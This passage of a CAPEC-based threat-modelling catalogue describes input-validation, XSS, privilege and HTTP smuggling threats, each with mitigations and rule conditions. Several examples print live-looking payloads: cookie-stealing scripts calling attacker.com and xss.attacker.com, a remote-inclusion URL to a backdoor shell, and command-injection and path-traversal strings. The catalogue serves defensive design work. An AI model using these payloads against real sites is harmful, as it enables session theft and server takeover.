  <dd>In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.</dd>

  <dt>Mitigations</dt>
  <dd>This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/229.html, http://cwe.mitre.org/data/definitions/770.html</dd>

  <dt>Condition</dt>
  <dd>target.usesXMLParser is False or target.controls.disablesDTD is False</dd>
</dl>



## INP23 File Content Injection

An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>The target software must consume files.The adversary must have access to modify files that the target software will consume.</dd>

  <dt>Example</dt>
  <dd>PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]</dd>

  <dt>Mitigations</dt>
  <dd>Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.Implementation: Virus scanning on hostImplementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/23.html, http://cwe.mitre.org/data/definitions/20.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.hasAccessControl is False and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)</dd>
</dl>



## DO05 XML Nested Payloads

Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. By nesting XML data and causing this data to be continuously self-referential, an attacker can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization. An attacker's goal is to leverage parser failure to his or her advantage. In most cases this type of an attack will result in a denial of service due to an application becoming unstable, freezing, or crash. However it may be possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.230.1].

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>An application uses an XML parser to perform transformation on user-controllable data.An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.</dd>

  <dt>Example</dt>
  <dd>An adversary crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim's system.</dd>

  <dt>Mitigations</dt>
  <dd>Carefully validate and sanitize all user-controllable data prior to passing it to the XML parser routine. Ensure that the resultant data is safe to pass to the XML parser.Perform validation on canonical data.Pick a robust implementation of an XML parser.Validate XML against a valid schema or DTD prior to parsing.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/230.html, http://cwe.mitre.org/data/definitions/112.html, http://cwe.mitre.org/data/definitions/770.html</dd>

  <dt>Condition</dt>
  <dd>target.usesXMLParser is True and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)</dd>
</dl>



## AC12 Privilege Escalation

An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd></dd>

  <dt>Example</dt>
  <dd>The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</dd>

  <dt>Mitigations</dt>
  <dd>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/233.html, http://cwe.mitre.org/data/definitions/269.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.hasAccessControl is False or target.controls.implementsPOLP is False</dd>
</dl>



## AC13 Hijacking a privileged process

An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.</dd>

  <dt>Example</dt>
  <dd>The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.</dd>

  <dt>Mitigations</dt>
  <dd>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/234.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/648.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.hasAccessControl is False or target.controls.implementsPOLP is False</dd>
</dl>



## AC14 Catching exception throw/signal from privileged block

Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.

<dl>
  <dt>Severity</dt>
  <dd>Very High</dd>

  <dt>Prerequisites</dt>
  <dd>The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal usersIn order to feasibly execute this class of attacks, the attacker must have the ability to hijack a privileged thread.This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.</dd>

  <dt>Example</dt>
  <dd>Attacker targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread. The Attacker could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.</dd>

  <dt>Mitigations</dt>
  <dd>Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/236.html, http://cwe.mitre.org/data/definitions/270.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.implementsPOLP is False and (target.usesEnvironmentVariables is True or target.controls.validatesInput is False)</dd>
</dl>



## INP24 Filter Failure through Buffer Overflow

In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Ability to control the length of data passed to an active filter.</dd>

  <dt>Example</dt>
  <dd>Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.</dd>

  <dt>Mitigations</dt>
  <dd>Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.Pre-design: Use a language or compiler that performs automatic bounds checking.Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.Operational: Use OS-level preventative functionality. Not a complete solution.Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/24.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/680.html, http://cwe.mitre.org/data/definitions/20.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.checksInputBounds is False or target.controls.validatesInput is False</dd>
</dl>



## INP25 Resource Injection

An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target application allows the user to both specify the identifier used to access a system resource. Through this permission, the user gains the capability to perform actions on that resource (e.g., overwrite the file)</dd>

  <dt>Example</dt>
  <dd>A Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as '../../tomcat/confserver.xml', which causes the application to delete one of its own configuration files.</dd>

  <dt>Mitigations</dt>
  <dd>Ensure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/240.html, https://capec.mitre.org/data/definitions/240.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## INP26 Code Injection

An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target software does not validate user-controlled input such that the execution of a process may be altered by sending code in through legitimate data channels, using no other mechanism.</dd>

  <dt>Example</dt>
  <dd>When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.</dd>

  <dt>Mitigations</dt>
  <dd>Utilize strict type, character, and encoding enforcementEnsure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/242.html, http://cwe.mitre.org/data/definitions/94.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## INP27 XSS Targeting HTML Attributes

An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must fail to adequately sanitize HTML attributes against the presence of dangerous commands.</dd>

  <dt>Example</dt>
  <dd>Application allows execution of any Javascript they want on the browser which enables the adversary to steal session tokens and perform malicious activities.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/243.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## INP28 XSS Targeting URI Placeholders

An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.</dd>

  <dt>Example</dt>
  <dd>The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False</dd>
</dl>



## INP29 XSS Using Doubled Characters

The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted web application does not fully normalize input before checking for prohibited syntax. In particular, it must fail to recognize prohibited methods preceded by certain sequences of repeated characters.</dd>

  <dt>Example</dt>
  <dd>By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/245.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False</dd>
</dl>



## INP30 XSS Using Invalid Characters

An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The target must fail to remove invalid characters from input and fail to adequately scan beyond these characters.</dd>

  <dt>Example</dt>
  <dd>The software may attempt to remove a 'javascript:' URI scheme, but a 'java%00script:' URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end operations.Implementation: The victim should configure the browser to minimize active content from untrusted sources.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/247.html, https://cwe.mitre.org/data/definitions/86.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## INP31 Command Injection

An adversary looking to execute a command of their choosing, injects new items into an existing command thus modifying interpretation away from what was intended. Commands in this context are often standalone strings that are interpreted by a downstream component and cause specific responses. This type of attack is possible when untrusted values are used to build these command strings. Weaknesses in input validation or command construction can enable the attack and lead to successful exploitation.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target application must accept input from the user and then use this input in the construction of commands to be executed. In virtually all cases, this is some form of string input that is concatenated to a constant string defined by the application to form the full command to be executed.</dd>

  <dt>Example</dt>
  <dd>Consider a URL 'http://sensitive/cgi-bin/userData.pl?doc=user1.txt'. If the URL is modified like so - 'http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|', it executed the command '/bin/ls|'. This is how command injection is implemented.</dd>

  <dt>Mitigations</dt>
  <dd>All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.Input should be encoded prior to use in commands to make sure command related characters are not treated as part of the command. For example, quotation characters may need to be encoded so that the application does not treat the quotation as a delimiter.Input should be parameterized, or restricted to data sections of a command, thus removing the chance that the input will be treated as part of the command itself.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/248.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.usesParameterizedInput is False and (target.controls.validatesInput is False or target.controls.sanitizesInput is False)</dd>
</dl>



## INP32 XML Injection

An attacker utilizes crafted XML user-controllable input to probe, attack, and inject data into the XML database, using techniques similar to SQL injection. The user-controllable input can allow for unauthorized viewing of data, bypassing authentication or the front-end application for direct XML database access, and possibly altering database information.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>XML queries used to process user input and retrieve information stored in XML documentsUser-controllable input not properly sanitized</dd>

  <dt>Example</dt>
  <dd>Consider an application that uses an XML database to authenticate its users. The application retrieves the user name and password from a request and forms an XPath expression to query the database. An attacker can successfully bypass authentication and login without valid credentials through XPath Injection. This can be achieved by injecting the query to the XML database with XPath syntax that causes the authentication check to fail. Improper validation of user-controllable input and use of a non-parameterized XPath expression enable the attacker to inject an XPath expression that causes authentication bypass.</dd>

  <dt>Mitigations</dt>
  <dd>Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as content that can be interpreted in the context of an XML data or a query. Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the database or application.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/250.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False</dd>
</dl>



## INP33 Remote Code Inclusion

The attacker forces an application to load arbitrary code files from a remote location. The attacker could use this to try to load old versions of library files that have known vulnerabilities, to load malicious files that the attacker placed on the remote machine, or to otherwise change the functionality of the targeted application in unexpected ways.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Target application server must allow remote files to be included.The malicious file must be placed on the remote machine previously.</dd>

  <dt>Example</dt>
  <dd>URL string http://www.example.com/vuln_page.php?file=http://www.hacker.com/backdoor_ contains an external reference to a backdoor code file stored in a remote location (http://www.hacker.com/backdoor_shell.php.) Having been uploaded to the application, this backdoor can later be used to hijack the underlying server or gain access to the application database.</dd>

  <dt>Mitigations</dt>
  <dd>Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/253.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## INP34 SOAP Array Overflow

An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array.</dd>

  <dt>Example</dt>
  <dd>Refer to this example - http://projects.webappsec.org/w/page/13246962/SOAP%20Array%20Abuse</dd>

  <dt>Mitigations</dt>
  <dd>If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/256.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.checksInputBounds is False</dd>
</dl>



## INP35 Leverage Alternate Encoding

An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host.</dd>

  <dt>Example</dt>
  <dd>Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified encoding strings, which allows remote attackers to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka Post Encoding Information Disclosure Vulnerability. Related Vulnerabilities CVE-2010-0488Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.</dd>

  <dt>Mitigations</dt>
  <dd>Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/267.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.sanitizesInput is False</dd>
</dl>



## DE04 Audit Log Manipulation

The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>The target host is logging the action and data of the user.The target host insufficiently protects access to the logs or logging mechanisms.</dd>

  <dt>Example</dt>
  <dd>The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).</dd>

  <dt>Mitigations</dt>
  <dd>Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.validatesInput is False or target.controls.implementsPOLP is False</dd>
</dl>



## AC15 Schema Poisoning

An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>Some level of access to modify the target schema.The schema used by the target application must be improperly secured against unauthorized modification and manipulation.</dd>

  <dt>Example</dt>
  <dd>In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input: { title: Contact, type: object, properties: { Name: { type: string }, Phone: { type: string }, Email: { type: string }, Address: { type: string } }, required: [Name, Phone, Email, Address] } If the 'name' attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named name, an adversary could make the following schema change: ALTER TABLE Contacts MODIFY Name VARCHAR(65353); The Name field of the Conteacts table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Protect the schema against unauthorized modification.Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/271.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.implementsPOLP is False</dd>
</dl>



## INP36 HTTP Response Smuggling

An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.

<dl>
  <dt>Severity</dt>
  <dd>Medium</dd>

  <dt>Prerequisites</dt>
  <dd>The targeted server must allow the attacker to insert content that will appear in the server's response.</dd>

  <dt>Example</dt>
  <dd>The attacker targets the cache service used by the organization to reduce load on the internet bandwidth. This server can be a cache server on the LAN or other application server caching the static WebPages. The attacker sends three different HTTP request as shown - Request 1: POST request for http://www.netbanking.com, Request 2: GET request for http:www.netbanking.com/FD.html, Request 3: GET request for http://www.netbanking.com/FD-Rates.html. Due to malformed request cache server assumes request 1 and 3 as valid request and forwards the entire request to the webserver. Webserver which strictly follow then HTTP parsing rule responds with the http://www.netbanking.com/FD.html  HTML page. This is happened because webserver consider request 1 and 2 as valid one. Cache server stores this response against the request 3. When normal users request for page http://www.netbanking.com/FD-Rates.html, cache server responds with the page http://www.netbanking.com/FD.html.Hence attacker will succeeds in cache poisoning.</dd>

  <dt>Mitigations</dt>
  <dd>Design: Employ strict adherence to interpretations of HTTP messages wherever possible.Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.</dd>

  <dt>References</dt>
  <dd>https://capec.mitre.org/data/definitions/273.html</dd>

  <dt>Condition</dt>
  <dd>target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False</dd>
</dl>



## INP37 HTTP Request Smuggling

HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.

<dl>
  <dt>Severity</dt>
  <dd>High</dd>

  <dt>Prerequisites</dt>
  <dd>An additional HTTP entity such as an application firewall or a web caching proxy between the attacker and the second entity such as a web serverDifferences in the way the two HTTP entities parse HTTP requests</dd>

  <dt>Example</dt>
